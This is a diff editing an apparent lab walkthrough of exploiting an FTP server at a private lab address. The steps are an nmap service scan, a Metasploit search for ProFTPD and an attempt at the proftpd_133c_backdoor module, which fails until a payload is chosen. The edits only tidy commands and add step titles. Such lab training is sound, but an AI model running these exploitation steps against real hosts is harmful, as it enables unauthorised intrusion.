@@ -3,7 +3,7 @@
 ## Step 1 - Search for exploits on target
 
 ```bash
-nmap nmap -sC -sV 10.5.0.254
+nmap -sC -sV 10.5.0.254
 ```
 
 ```markdown
@@ -20,7 +20,7 @@ PORT   STATE SERVICE VERSION
 msfconsole
 ```
 
-### Step 2.1
+### Step 2.1: Search by service running
 
 ```bash
 search ProFTPD
@@ -32,10 +32,9 @@ run
 ```markdown
 [-] 10.5.0.254:21 - Exploit failed: A payload has not been selected.
 [*] Exploit completed, but no session was created.
-msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
 ```
 
-### Step 2.2
+### Step 2.2: Check local host IP
 
 ```bash
 ifconfig
@@ -46,7 +45,7 @@ eth-lab: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.5.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
 ```
 
-### Step 2.3
+### Step 2.3: Try payload one by one
 
 ```bash
 show payloads
